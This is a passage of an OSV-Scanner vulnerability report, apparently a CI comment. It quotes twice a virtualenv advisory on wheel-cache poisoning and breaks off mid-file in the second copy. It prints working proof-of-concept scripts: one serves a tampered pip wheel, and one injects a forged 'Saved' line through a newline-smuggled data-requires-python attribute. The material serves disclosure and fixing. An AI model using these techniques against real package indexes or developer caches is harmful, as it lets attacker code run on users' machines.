--upgrade-embed-wheels` refused the mismatch, and a subsequent\n\u003e environment used the bundled pip. In the attack case the index added a link whose `data-requires-python` contained a\n\u003e forged `Saved \u003cpath\u003e` line pointing at a genuine bundled wheel. The upgrade then exited without a digest error, recorded\n\u003e the modified wheel in its update log, and a later environment's `pip --version` ran a line added by the index. The\n\u003e reproduction used a known absolute path to the genuine bundled wheel; that prerequisite is part of this variant.\n\u003e \n\u003e The report also shows that a refused wheel can replace a previously accepted file of the same name in `wheel/house`,\n\u003e leaving rejected bytes available for later use. It does not claim to bypass TLS or affect the default PyPI setup. The\n\u003e gap follows the digest check added in #3251, first released in 21.7.12.\n\u003e [PR #3430](https://github.com/pypa/virtualenv/pull/3430) downloads to a private temporary directory, verifies the actual\n\u003e archive, and promotes it only after acceptance.\n\u003e \n\u003e ## Attack sequence\n\u003e \n\u003e ```mermaid\n\u003e sequenceDiagram\n\u003e     participant I as Configured index\n\u003e     participant P as pip download\n\u003e     participant C as wheel/house cache\n\u003e     participant V as virtualenv digest check\n\u003e     participant N as New environment\n\u003e     I-\u003e\u003eP: modified wheel and forged Saved line\n\u003e     P-\u003e\u003eC: write modified wheel directly\n\u003e     P--\u003e\u003eV: stdout names genuine bundled wheel\n\u003e     V-\u003e\u003eV: hash genuine wheel and accept\n\u003e     V-\u003e\u003eC: record modified wheel for reuse\n\u003e     C-\u003e\u003eN: seed modified pip without rehash\n\u003e     Note over P,C: Even a rejected wheel can remain in the cache\n\u003e ```\n\u003e \n\u003e ## Reproducer files\n\u003e \n\u003e The following files are from the scanner report for `ANT-2026-ST00DRO3`. They were tested against commit `a857a7823c73`\n\u003e in the scanner image. The `repro` entrypoint expects companion files under `/tmp/repro.d`; cases that change user IDs\n\u003e need a disposable root-capable container. The last output line is `BUG` when the reported behavior occurs. These files\n\u003e are included as evidence and were not rerun for this advisory update.\n\u003e \n\u003e **`repro`**\n\u003e \n\u003e ```text\n\u003e #!/usr/bin/env python3\n\u003e import atexit\n\u003e import hashlib\n\u003e import json\n\u003e import os\n\u003e import shutil\n\u003e import subprocess\n\u003e import sys\n\u003e from pathlib import Path\n\u003e \n\u003e companions = Path(\"/tmp/repro.d\")\n\u003e work = Path(\"/tmp/forged-saved-line\")\n\u003e home = work / \"home\"\n\u003e app_data = home / \".cache\" / \"virtualenv\"\n\u003e this_python = f\"{sys.version_info.major}.{sys.version_info.minor}\"  # the target; each Python has its own update log\n\u003e update_log_of_pip = app_data / \"wheel\" / this_python / \"embed\" / \"3\" / \"pip.json\"\n\u003e virtualenv = [sys.executable, companions / \"virtualenv_with_local_pypi_json.py\", work / \"pypi\"]\n\u003e as_user = {\"cwd\": home, \"env\": {\"HOME\": str(home), \"PATH\": os.environ[\"PATH\"]}, \"capture_output\": True, \"text\": True}\n\u003e added_code_prints = \"code added by the index\"  # the line index_serves_modified_pip.py adds to pip/__init__.py\n\u003e \n\u003e \n\u003e def user_upgrades_seed_wheels_and_creates_env():\n\u003e     # each case starts from an empty app-data\n\u003e     shutil.rmtree(app_data, ignore_errors=True)\n\u003e     shutil.rmtree(home / \"env\", ignore_errors=True)\n\u003e     upgrade = subprocess.run([*virtualenv, \"--upgrade-embed-wheels\"], **as_user)\n\u003e     # --no-periodic-update: the background update is another process, which the PyPI stand-in does not reach\n\u003e     subprocess.run([*virtualenv, \"--no-periodic-update\", \"env\"], **as_user, check=True)\n\u003e     pip_version = subprocess.run([home / \"env\" / \"bin\" / \"python\", \"-m\", \"pip\", \"--version\"], **as_user, check=True)\n\u003e     # one thread per target Python; a refused wheel ends its thread with a traceback on stderr, the exit code stays 0\n\u003e     refusal = next((line for line in upgrade.stderr.splitlines() if \"but PyPI reports\" in line), None)\n\u003e     logged = []\n\u003e     if update_log_of_pip.exists():  # a failed update writes no log\n\u003e         logged = [entry[\"filename\"] for entry in json.loads(update_log_of_pip.read_text())[\"versions\"]]\n\u003e     return refusal, logged, pip_version.stdout.splitlines()\n\u003e \n\u003e \n\u003e # set up: PyPI's answers, a faithful mirror of PyPI on 127.0.0.1:8099, a user whose pip.conf points pip at it\n\u003e shutil.rmtree(work, ignore_errors=True)\n\u003e (home / \".config\" / \"pip\").mkdir(parents=True)\n\u003e shutil.copy(companions / \"pip.conf\", home / \".config\" / \"pip\" / \"pip.conf\")\n\u003e subprocess.run([sys.executable, companions / \"pypi_json_and_mirror.py\", work / \"pypi\", work / \"index\"], check=True)\n\u003e index_server = subprocess.Popen(\n\u003e     [sys.executable, \"-u\", \"-m\", \"http.server\", \"8099\", \"--bind\", \"127.0.0.1\", \"--directory\", work / \"index\"],\n\u003e     stdout=subprocess.PIPE,\n\u003e     stderr=subprocess.DEVNULL,\n\u003e     text=True,\n\u003e )\n\u003e atexit.register(index_server.kill)\n\u003e assert index_server.stdout.readline().startswith(\"Serving HTTP\"), \"index server did not start\"  # printed once bound\n\u003e \n\u003e # control: the index serves a modified pip 26.0.1, and virtualenv's comparison with PyPI's SHA-256 refuses it\n\u003e subprocess.run([sys.executable, companions / \"index_serves_modified_pip.py\", work / \"index\"], check=True)\n\u003e refusal, logged, pip_says = user_upgrades_seed_wheels_and_creates_env()\n\u003e print(\"CONTROL  modified pip: --upgrade-embed-wheels refused with:\", refusal)\n\u003e print(\"CONTROL  modified pip: update log of pip lists\", logged)\n\u003e print(\"CONTROL  modified pip: pip --version in the new env prints\", pip_says)\n\u003e control_ran_added_code = added_code_prints in \"\\n\".join(pip_says)\n\u003e \n\u003e # attack: the index also adds one link, whose data-requires-python puts a \"Saved \u003cpath\u003e\" line into pip's output\n\u003e subprocess.run([sys.executable, companions / \"index_forges_saved_line.py\", work / \"index\"], check=True)\n\u003e refusal, logged, pip_says = user_upgrades_seed_wheels_and_creates_env()\n\u003e stored_wheel = app_data / \"wheel\" / \"house\" / \"pip-26.0.1-py3-none-any.whl\"\n\u003e stored_sha256 = hashlib.sha256(stored_wheel.read_bytes()).hexdigest()\n\u003e pypi_sha256 = json.loads((work / \"pypi\" / \"pip.json\").read_text())[\"releases\"][\"26.0.1\"][0][\"digests\"][\"sha256\"]\n\u003e print(\"OBSERVED + forged line: --upgrade-embed-wheels refused with:\", refusal)\n\u003e print(\"OBSERVED + forged line: update log of pip lists\", logged)\n\u003e print(\"OBSERVED + forged line: sha256 of that wheel in wheel/house:\", stored_sha256)\n\u003e print(\"OBSERVED + forged line: sha256 PyPI publishes for that name:\", pypi_sha256)\n\u003e print(\"OBSERVED + forged line: pip --version in the new env prints\", pip_says)\n\u003e attack_ran_added_code = added_code_prints in \"\\n\".join(pip_says)\n\u003e \n\u003e # check: the same modified wheel, refused without the forged line, is seeded with it\n\u003e print(\"BUG\" if attack_ran_added_code and not control_ran_added_code else \"OK\")\n\u003e ```\n\u003e \n\u003e **`repro.d/index_forges_saved_line.py`**\n\u003e \n\u003e ```text\n\u003e \"\"\"Attacker, as the operator of the index the user's pip.conf names: make pip print a \"Saved \u003cpath\u003e\" line of its choice.\n\u003e \n\u003e usage: index_forges_saved_line.py \u003cindex_dir\u003e\n\u003e \n\u003e Adds one link to the page of pip; the file behind it is a renamed copy of the genuine pip 26.2.1.\n\u003e \"\"\"\n\u003e \n\u003e import shutil\n\u003e import sys\n\u003e from pathlib import Path\n\u003e \n\u003e # a genuine PyPI file named pip-26.0.1-py3-none-any.whl on the user's disk: the wheel virtualenv bundles for Python 3.9,\n\u003e # at the same path for every user of this image\n\u003e GENUINE_WHEEL_ON_USERS_DISK = \"/src/src/virtualenv/seed/wheels/embed/pip-26.0.1-py3-none-any.whl\"\n\u003e \n\u003e index_dir = Path(sys.argv[1])\n\u003e \n\u003e # named 100.0 while its METADATA says 26.2.1: pip tries it first, then drops it with\n\u003e # \"Discarding \u003clink\u003e (requires-python:\u003cattribute\u003e): ... has inconsistent version\" on stdout\n\u003e shutil.copy(index_dir / \"files\" / \"pip-26.2.1-py3-none-any.whl\", index_dir / \"files\" / \"pip-100.0-py3-none-any.whl\")\n\u003e \n\u003e # pip keeps a link whose data-requires-python it cannot parse, and prints the attribute as written; \u0026#10; is a line feed\n\u003e with (index_dir / \"simple\" / \"pip\" / \"index.html\").open(\"a\") as page:\n\u003e     page.write(\n\u003e         '\u003ca href=\"/files/pip-100.0-py3-none-any.whl\"'\n\u003e         f' data-requires-python=\"\u0026#10;Saved {GENUINE_WHEEL_ON_USERS_DISK}\u0026#10;\"\u003epip-100.0-py3-none-any.whl\u003c/a\u003e\\n'\n\u003e     )\n\u003e ```\n\u003e \n\u003e **`repro.d/index_serves_modified_pip.py`**\n\u003e \n\u003e ```text\n\u003e \"\"\"Attacker, as the operator of the index the user's pip.conf names: serve a modified pip under a genuine name.\n\u003e \n\u003e usage: index_serves_modified_pip.py \u003cindex_dir\u003e\n\u003e \n\u003e pip 26.0.1 on the index gets one more line of code in pip/__init__.py and becomes the only pip on offer. On its own,\n\u003e virtualenv's comparison with PyPI's SHA-256 catches this.\n\u003e \"\"\"\n\u003e \n\u003e import hashlib\n\u003e import io\n\u003e import sys\n\u003e import zipfile\n\u003e from pathlib import Path\n\u003e \n\u003e ADDED_CODE = b'\\nprint(\"code added by the index runs as uid\", __import__(\"os\").getuid())\\n'\n\u003e \n\u003e index_dir = Path(sys.argv[1])\n\u003e wheel = index_dir / \"files\" / \"pip-26.0.1-py3-none-any.whl\"\n\u003e \n\u003e genuine = zipfile.ZipFile(io.BytesIO(wheel.read_bytes()))\n\u003e with zipfile.ZipFile(wheel, \"w\") as modified:\n\u003e     for entry in genuine.infolist():\n\u003e         content = genuine.read(entry)\n\u003e         if entry.filename == \"pip/__init__.py\":\n\u003e             content += ADDED_CODE\n\u003e         modified.writestr(entry, content)\n\u003e \n\u003e # the #sha256= that every PyPI link carries matters: --upgrade-embed-wheels copies the bundled pip 26.0.1 into pip's\n\u003e # download folder first, and pip replaces a file of the same name there only when the link's digest differs\n\u003e sha256 = hashlib.sha256(wheel.read_bytes()).hexdigest()\n\u003e (index_dir / \"simple\" / \"pip\" / \"index.html\").write_text(\n\u003e     f'\u003c!DOCTYPE html\u003e\\n\u003ca href=\"/files/{wheel.name}#sha256={sha256}\"\u003e{wheel.name}\u003c/a\u003e\\n'\n\u003e )\n\u003e ```\n\u003e \n\u003e **`repro.d/pip.conf`**\n\u003e \n\u003e ```text\n\u003e [global]\n\u003e index-url = http://127.0.0.1:8099/simple\n\u003e ```\n\u003e \n\u003e **`repro.d/pypi_json_and_mirror.py`**\n\u003e \n\u003e ```text\n\u003e \"\"\"Setup: what PyPI's JSON API answers for the seed wheels, and an index that mirrors PyPI faithfully.\n\u003e \n\u003e usage: pypi_json_and_mirror.py \u003cpypi_dir\u003e \u003cindex_dir\u003e\n\u003e \n\u003e The wheels bundled with virtualenv are genuine PyPI files. \u003cpypi_dir\u003e/\u003cproject\u003e.json is what\n\u003e https://pypi.org/pypi/\u003cproject\u003e/json answers for them, with the digests of virtualenv's BUNDLE_SHA256 table.\n\u003e \u003cindex_dir\u003e is a PEP 503 tree (simple/\u003cproject\u003e/index.html, files/) that offers exactly these files.\n\u003e \"\"\"\n\u003e \n\u003e import json\n\u003e import shutil\n\u003e import sys\n\u003e import zipfile\n\u003e from email.parser import HeaderParser\n\u003e from html import escape\n\u003e from pathlib import Path\n\u003e \n\u003e from virtualenv.seed.wheels.embed import BUNDLE_FOLDER, BUNDLE_SHA256\n\u003e \n\u003e pypi_dir, index_dir = Path(sys.argv[1]), Path(sys.argv[2])\n\u003e pypi_dir.mkdir()\n\u003e (index_dir / \"files\").mkdir(parents=True)\n\u003e \n\u003e for project in (\"pip\", \"setuptools\"):\n\u003e     releases, links = {}, []\n\u003e     for filename, sha256 in BUNDLE_SHA256.items():\n\u003e         name, version = filename.split(\"-\")[:2]\n\u003e         if name != project:\n\u003e             continue\n\u003e         shutil.copy(BUNDLE_FOLDER / filename, index_dir / \"files\")\n\u003e         releases[version] = [{\"filename\": filename, \"digests\": {\"sha256\": sha256}, \"upload_time\": \"2026-01-01T00:00:00\"}]\n\u003e         with zipfile.ZipFile(BUNDLE_FOLDER / filename) as wheel:\n\u003e             metadata = HeaderParser().parsestr(wheel.read(f\"{name}-{version}.dist-info/METADATA\").decode())\n\u003e         requires_python = escape(metadata[\"Requires-Python\"])\n\u003e         links.append(f'\u003ca href=\"/files/{filename}#sha256={sha256}\" data-requires-python=\"{requires_python}\"\u003e{filename}\u003c/a\u003e')\n\u003e     (pypi_dir / f\"{project}.json\").write_text(json.dumps({\"releases\": releases}))\n\u003e     (index_dir / \"simple\" / project).mkdir(parents=True)\n\u003e     (index_dir / \"simple\" / project / \"index.html\").write_text(\"\u003c!DOCTYPE html\u003e\\n\" + \"\\n\".join(links) + \"\\n\")\n\u003e ```\n\u003e \n\u003e **`repro.d/virtualenv_with_local_pypi_json.py`**\n\u003e \n\u003e ```text\n\u003e \"\"\"Setup: the virtualenv command line, with PyPI's JSON API answered from local files because there is no network.\n\u003e \n\u003e usage: virtualenv_with_local_pypi_json.py \u003cpypi_dir\u003e \u003cvirtualenv arguments...\u003e\n\u003e \n\u003e Only the request for https://pypi.org/pypi/\u003cproject\u003e/json is replaced: it is answered from \u003cpypi_dir\u003e/\u003cproject\u003e.json.\n\u003e pip, the index pip talks to and the rest of virtualenv are the real thing.\n\u003e \"\"\"\n\u003e \n\u003e import sys\n\u003e from pathlib import Path\n\u003e from unittest import mock\n\u003e \n\u003e from virtualenv.__main__ import run_with_catch\n\u003e \n\u003e pypi_dir = Path(sys.argv[1])\n\u003e \n\u003e \n\u003e def pypi_json_api(url, context):\n\u003e     assert url.startswith(\"https://pypi.org/pypi/\") and context is None, url\n\u003e     project = url.split(\"/\")[4]\n\u003e     return (pypi_dir / f\"{project}.json\").open(\"rb\")\n\u003e \n\u003e \n\u003e with mock.patch(\"virtualenv.seed.wheels.periodic_update.urlopen\", pypi_json_api):\n\u003e     run_with_catch(sys.argv[2:])\n\u003e ```\n\u003e \n\u003e ## Impact\n\u003e \n\u003e A file rejected during download verification can remain available for later cache selection. Exploitation requires\n\u003e additional control over the downloaded data or archive selection; this finding alone does not bypass TLS.\n\u003e \n\u003e Severity: low.\n\u003e \n\u003e ## Versions tested\n\u003e \n\u003e The confirmed release is 21.14.8. The affected range records that release only; it does not establish the first affected\n\u003e version or exclude earlier releases. Fixed in 21.14.9.\n\u003e \n\u003e The fix downloads into a private temporary directory and verifies archive identity, requested version, digest\n\u003e where applicable, and Python compatibility before promoting a wheel into the reusable cache.\n\u003e \n\u003e Fix: [PR #3430](https://github.com/pypa/virtualenv/pull/3430).\n\u003e \n\u003e ## Known mitigation\n\u003e \n\u003e After a failed verification, discard that download cache before reusing it. Use embedded wheels while reviewing\n\u003e unexpected download failures.\n\u003e \n\u003e ## Affected release\n\u003e \n\u003e - [x] The problem reproduces on virtualenv 21.14.8.\n\u003e \n\u003e ## Credits\n\u003e \n\u003e Reported by Anthropic's OSS Scanner as ANT-2026-ST00DRO3.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/.staging/devenvironment/containers/services/api/poetry.lock | virtualenv | 20.31.2 |\n| lockfile:/home/runner/work/empathy/empathy/egolint/uv.lock | virtualenv | 21.7.4 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-494p-63j8-28p3 | virtualenv | 21.14.9 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/.staging/devenvironment/containers/services/api/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-113714\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-113714\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n",
                "text": "**Your dependency is vulnerable to [CVE-2026-113714](https://osv.dev/CVE-2026-113714)**.\n\n## [GHSA-494p-63j8-28p3](https://osv.dev/GHSA-494p-63j8-28p3)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ## Summary\n\u003e \n\u003e Wheel downloads go directly into the reusable wheelhouse, while the verification target is selected from pip's textual\n\u003e output. A verification failure does not remove the downloaded file from that cache.\n\u003e \n\u003e Anthropic's OSS Scanner reported this as `ANT-2026-ST00DRO3` in `virtualenv-20261015-005`, received on 15 October 2026.\n\u003e \n\u003e ## Affected area\n\u003e \n\u003e Download selection and promotion into the reusable wheel cache.\n\u003e \n\u003e ## Attacker-controlled input\n\u003e \n\u003e A download must fail verification, or the archive selected from pip output must differ from the file later reused.\n\u003e Default-index digest verification must be enabled. Existing custom-index exceptions are outside the promised PyPI\n\u003e comparison.\n\u003e \n\u003e ## Affected code\n\u003e \n\u003e The relevant 21.14.8 source is in\n\u003e [wheel download and digest check](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/seed/wheels/acquire.py).\n\u003e \n\u003e ## Mechanism\n\u003e \n\u003e `download_wheel()` tells pip to write directly into the reusable `wheel/house` cache. It then selects a path to hash\n\u003e from the first `Saved ` line in pip's stdout, rather than from the file pip actually placed there. A package index can\n\u003e inject such a line through a discarded link's `data-requires-python` attribute. A separate failure exists without the\n\u003e forged line: a digest mismatch raises after the downloaded wheel has entered the cache, and the rejected bytes remain\n\u003e there. Later wheel selection does not hash the cached file again.\n\u003e \n\u003e ## Reproduction and evidence\n\u003e \n\u003e The scanner used a local index configured in `pip.conf`, with PyPI digest comparison still enabled. In the control case\n\u003e it served a modified pip wheel alone. `virtualenv --upgrade-embed-wheels` refused the mismatch, and a subsequent\n\u003e environment used the bundled pip. In the attack case the index added a link whose `data-requires-python` contained a\n\u003e forged `Saved \u003cpath\u003e` line pointing at a genuine bundled wheel. The upgrade then exited without a digest error, recorded\n\u003e the modified wheel in its update log, and a later environment's `pip --version` ran a line added by the index. The\n\u003e reproduction used a known absolute path to the genuine bundled wheel; that prerequisite is part of this variant.\n\u003e \n\u003e The report also shows that a refused wheel can replace a previously accepted file of the same name in `wheel/house`,\n\u003e leaving rejected bytes available for later use. It does not claim to bypass TLS or affect the default PyPI setup. The\n\u003e gap follows the digest check added in #3251, first released in 21.7.12.\n\u003e [PR #3430](https://github.com/pypa/virtualenv/pull/3430) downloads to a private temporary directory, verifies the actual\n\u003e archive, and promotes it only after acceptance.\n\u003e \n\u003e ## Attack sequence\n\u003e \n\u003e ```mermaid\n\u003e sequenceDiagram\n\u003e     participant I as Configured index\n\u003e     participant P as pip download\n\u003e     participant C as wheel/house cache\n\u003e     participant V as virtualenv digest check\n\u003e     participant N as New environment\n\u003e     I-\u003e\u003eP: modified wheel and forged Saved line\n\u003e     P-\u003e\u003eC: write modified wheel directly\n\u003e     P--\u003e\u003eV: stdout names genuine bundled wheel\n\u003e     V-\u003e\u003eV: hash genuine wheel and accept\n\u003e     V-\u003e\u003eC: record modified wheel for reuse\n\u003e     C-\u003e\u003eN: seed modified pip without rehash\n\u003e     Note over P,C: Even a rejected wheel can remain in the cache\n\u003e ```\n\u003e \n\u003e ## Reproducer files\n\u003e \n\u003e The following files are from the scanner report for `ANT-2026-ST00DRO3`. They were tested against commit `a857a7823c73`\n\u003e in the scanner image. The `repro` entrypoint expects companion files under `/tmp/repro.d`; cases that change user IDs\n\u003e need a disposable root-capable container. The last output line is `BUG` when the reported behavior occurs. These files\n\u003e are included as evidence and were not rerun for this advisory update.\n\u003e \n\u003e **`repro`**\n\u003e \n\u003e ```text\n\u003e #!/usr/bin/env python3\n\u003e import atexit\n\u003e import hashlib\n\u003e import json\n\u003e import os\n\u003e import shutil\n\u003e import subprocess\n\u003e import sys\n\u003e from pathlib import Path\n\u003e \n\u003e companions = Path(\"/tmp/repro.d\")\n\u003e work = Path(\"/tmp/forged-saved-line\")\n\u003e home = work / \"home\"\n\u003e app_data = home / \".cache\" / \"virtualenv\"\n\u003e this_python = f\"{sys.version_info.major}.{sys.version_info.minor}\"  # the target; each Python has its own update log\n\u003e update_log_of_pip = app_data / \"wheel\" / this_python / \"embed\" / \"3\" / \"pip.json\"\n\u003e virtualenv = [sys.executable, companions / \"virtualenv_with_local_pypi_json.py\", work / \"pypi\"]\n\u003e as_user = {\"cwd\": home, \"env\": {\"HOME\": str(home), \"PATH\": os.environ[\"PATH\"]}, \"capture_output\": True, \"text\": True}\n\u003e added_code_prints = \"code added by the index\"  # the line index_serves_modified_pip.py adds to pip/__init__.py\n\u003e \n\u003e \n\u003e def user_upgrades_seed_wheels_and_creates_env():\n\u003e     # each case starts from an empty app-data\n\u003e     shutil.rmtree(app_data, ignore_errors=True)\n\u003e     shutil.rmtree(home / \"env\", ignore_errors=True)\n\u003e     upgrade = subprocess.run([*virtualenv, \"--upgrade-embed-wheels\"], **as_user)\n\u003e     # --no-periodic-update: the background update is another process, which the PyPI stand-in does not reach\n\u003e     subprocess.run([*virtualenv, \"--no-periodic-update\", \"env\"], **as_user, check=True)\n\u003e     pip_version = subprocess.run([home / \"env\" / \"bin\" / \"python\", \"-m\", \"pip\", \"--version\"], **as_user, check=True)\n\u003e     # one thread per target Python; a refused wheel ends its thread with a traceback on stderr, the exit code stays 0\n\u003e     refusal = next((line for line in upgrade.stderr.splitlines() if \"but PyPI reports\" in line), None)\n\u003e     logged = []\n\u003e     if update_log_of_pip.exists():  # a failed update writes no log\n\u003e         logged = [entry[\"filename\"] for entry in json.loads(update_log_of_pip.read_text())[\"versions\"]]\n\u003e     return refusal, logged, pip_version.stdout.splitlines()\n\u003e \n\u003e \n\u003e # set up: PyPI's answers, a faithful mirror of PyPI on 127.0.0.1:8099, a user whose pip.conf points pip at it\n\u003e shutil.rmtree(work, ignore_errors=True)\n\u003e (home / \".config\" / \"pip\").mkdir(parents=True)\n\u003e shutil.copy(companions / \"pip.conf\", home / \".config\" / \"pip\" / \"pip.conf\")\n\u003e subprocess.run([sys.executable, companions / \"pypi_json_and_mirror.py\", work / \"pypi\", work / \"index\"], check=True)\n\u003e index_server = subprocess.Popen(\n\u003e     [sys.executable, \"-u\", \"-m\", \"http.server\", \"8099\", \"--bind\", \"127.0.0.1\", \"--directory\", work / \"index\"],\n\u003e     stdout=subprocess.PIPE,\n\u003e     stderr=subprocess.DEVNULL,\n\u003e     text=True,\n\u003e )\n\u003e atexit.register(index_server.kill)\n\u003e assert index_server.stdout.readline().startswith(\"Serving HTTP\"), \"index server did not start\"  # printed once bound\n\u003e \n\u003e # control: the index serves a modified pip 26.0.1, and virtualenv's comparison with PyPI's SHA-256 refuses it\n\u003e subprocess.run([sys.executable, companions / \"index_serves_modified_pip.py\", work / \"index\"], check=True)\n\u003e refusal, logged, pip_says = user_upgrades_seed_wheels_and_creates_env()\n\u003e print(\"CONTROL  modified pip: --upgrade-embed-wheels refused with:\", refusal)\n\u003e print(\"CONTROL  modified pip: update log of pip lists\", logged)\n\u003e print(\"CONTROL  modified pip: pip --version in the new env prints\", pip_says)\n\u003e control_ran_added_code = added_code_prints in \"\\n\".join(pip_says)\n\u003e \n\u003e # attack: the index also adds one link, whose data-requires-python puts a \"Saved \u003cpath\u003e\" line into pip's output\n\u003e subprocess.run([sys.executable, companions / \"index_forges_saved_line.py\", work / \"index\"], check=True)\n\u003e refusal, logged, pip_says = user_upgrades_seed_wheels_and_creates_env()\n\u003e stored_wheel = app_data / \"wheel\" / \"house\" / \"pip-26.0.1-py3-none-any.whl\"\n\u003e stored_sha256 = hashlib.sha256(stored_wheel.read_bytes()).hexdigest()\n\u003e pypi_sha256 = json.loads((work / \"pypi\" / \"pip.json\").read_text())[\"releases\"][\"26.0.1\"][0][\"digests\"][\"sha256\"]\n\u003e print(\"OBSERVED + forged line: --upgrade-embed-wheels refused with:\", refusal)\n\u003e print(\"OBSERVED + forged line: update log of pip lists\", logged)\n\u003e print(\"OBSERVED + forged line: sha256 of that wheel in wheel/house:\", stored_sha256)\n\u003e print(\"OBSERVED + forged line: sha256 PyPI publishes for that name:\", pypi_sha256)\n\u003e print(\"OBSERVED + forged line: pip --version in the new env prints\", pip_says)\n\u003e attack_ran_added_code = added_code_prints in \"\\n\".join(pip_says)\n\u003e \n\u003e # check: the same modified wheel, refused without the forged line, is seeded with it\n\u003e print(\"BUG\" if attack_ran_added_code and not control_ran_added_code else \"OK\")\n\u003e ```\n\u003e \n\u003e **`repro.d/index_forges_saved_line.py`**\n\u003e \n\u003e ```text\n\u003e \"\"\"Attacker, as the operator of the index the user's pip.conf names: make pip print a \"Saved \u003cpath\u003e\" line of its choice.\n\u003e \n\u003e usage: index_forges_saved_line.py \u003cindex_dir\u003e\n\u003e \n\u003e Adds one link to the page of pip; the file behind it is a renamed copy of the genuine pip 26.2.1.\n\u003e \"\"\"\n\u003e \n\u003e import shutil\n\u003e import sys\n\u003e from pathlib import Path\n\u003e \n\u003e # a genuine PyPI file named pip-26.0.1-py3-none-any.whl on the user's disk: the wheel virtualenv bundles for Python 3.9,\n\u003e # at the same path for every user of this image\n\u003e GENUINE_WHEEL_ON_USERS_DISK = \"/src/src/virtualenv/seed/wheels/embed/pip-26.0.1-py3-none-any.whl\"\n\u003e \n\u003e index_dir = Path(sys.argv[1])\n\u003e \n\u003e # named 100.0 while its METADATA says 26.2.1: pip tries it first, then drops it with\n\u003e # \"Discarding \u003clink\u003e (requires-python:\u003cattribute\u003e): ... has inconsistent version\" on stdout\n\u003e shutil.copy(index_dir / \"files\" / \"pip-26.2.1-py3-none-any.whl\", index_dir / \"files\" / \"pip-100.0-py3-none-any.whl\")\n\u003e \n\u003e # pip keeps a link whose data-requires-python it cannot parse, and prints the attribute as written; \u0026#10; is a line feed\n\u003e with (index_dir / \"simple\" / \"pip\" / \"index.html\").open(\"a\") as page:\n\u003e     page.write(\n\u003e         '\u003ca href=\"/files/pip-100.0-py3-none-any.whl\"'\n\u003e         f' data-requires-python=\"\u0026#10;Saved {GENUINE_WHEEL_ON_USERS_DISK}\u0026#10;\"\u003epip-100.0-py3-none-any.whl\u003c/a\u003e\\n'\n\u003e     )\n\u003e ```\n\u003e \n\u003e **`repro.d/index_serves_modified_pip.py`**\n\u003e \n\u003e ```text\n\u003e \"\"\"Attacker, as the operator of the index the user's pip.conf names: serve a modified pip under a genuine name.\n\u003e \n\u003e usage: index_serves_modified_pip.py \u003cindex_dir\u003e\n\u003e \n\u003e pip 26.0.1 on the index gets one more line of code in pip/__init__.py and becomes the only pip on offer. On its own,\n\u003e virtualenv's comparison with PyPI's SHA-256 catches this.\n\u003e \"\"\"\n\u003e \n\u003e import hashlib\n\u003e import io\n\u003e import sys\n\u003e import zipfile\n\u003e from pathlib import Path\n\u003e \n\u003e ADDED_CODE = b'\\nprint(\"code added by the index runs as uid\", __import__(\"os\").getuid())\\n'\n\u003e \n\u003e index_dir = Path(sys.argv[1])\n\u003e wheel = index_dir / \"files\" / \"pip-26.0.1-py3-none-any.whl\"\n\u003e \n\u003e genuine = zipfile.ZipFile(io.BytesIO(wheel.read_bytes()))\n\u003e with zipfile.ZipFile(wheel, \"w\") as modified:\n\u003e     for entry in genuine.infolist():\n\u003e         content = genuine.read(entry)\n\u003e         if entry.filename == \"pip/__init__.py\":\n\u003e             content += ADDED_CODE\n\u003e         modified.writestr(entry, content)\n\u003e \n\u003e # the #sha256= that every PyPI link carries matters: --upgrade-embed-wheels copies the bundled pip 26.0.1 into pip's\n\u003e # download folder first, and pip replaces a file of the same name there only when the link's digest differs\n\u003e sha256 = hashlib.sha256(wheel.read_bytes()).hexdigest()\n\u003e (index_dir / \"simple\" / \"pip\" / \"index.html\").write_text(\n\u003e     f'\u003c!DOCTYPE html\u003e\\n\u003ca href=\"/files/{wheel.name}#sha256={sha256}\"\u003e{wheel.name}\u003c/a\u003e\\n'\n\u003e )\n\u003e ```\n\u003e \n\u003e **`repro.d/pip.conf`**\n\u003e \n\u003e ```text\n\u003e [global]\n\u003e index-url = http://127.0.0.1:8099/simple\n\u003e ```\n\u003e \n\u003e **`repro.d/pypi_json_and_mirror.py`**\n\u003e \n\u003e ```text\n\u003e \"\"\"Setup: what PyPI's JSON API answers for the seed wheels, and an index that mirrors PyPI faithfully.\n\u003e \n\u003e usage: pypi_json_and_mirror.py \u003cpypi_dir\u003e \u003cindex_dir\u003e\n\u003e \n\u003e The wheels bundled with virtualenv are genuine PyPI files. \u003cpypi_dir\u003e/\u003cproject\u003e.json is what\n\u003e https://pypi.org/pypi/\u003cproject\u003e/json answers for them, with the digests of virtualenv's BUNDLE_SHA256 table.\n\u003e \u003cindex_dir\u003e is a PEP 503 tree (simple/\u003cproject\u003e/index.html, files/) that offers exactly these files.\n\u003e \"\"\"\n\u003e \n\u003e import json\n\u003e import shutil\n\u003e import sys\n\u003e import zipfile\n\u003e from email.parser import HeaderParser\n\u003e from html import escape\n\u003e from pathlib import Path\n\u003e \n\u003e from virtualenv.seed.wheels.embed import BUNDLE_FOLDER, BUNDLE_SHA256\n\u003e \n\u003e pypi_dir, index_dir = Path(sys.argv[1]), Path(sys.argv[2])\n\u003e pypi_dir.mkdir()\n\u003e (index_dir / \"files\").mkdir(parents=True)\n\u003e \n\u003e for project in (\"pip\", \"setuptools\"):\n\u003e     releases, links = {}, []\n\u003e     for filename, sha256 in BUNDLE_SHA256.items():\n\u003e         name, version = filename.split(\"-\")[:2]\n\u003e         if name != project:\n\u003e             continue\n\u003e         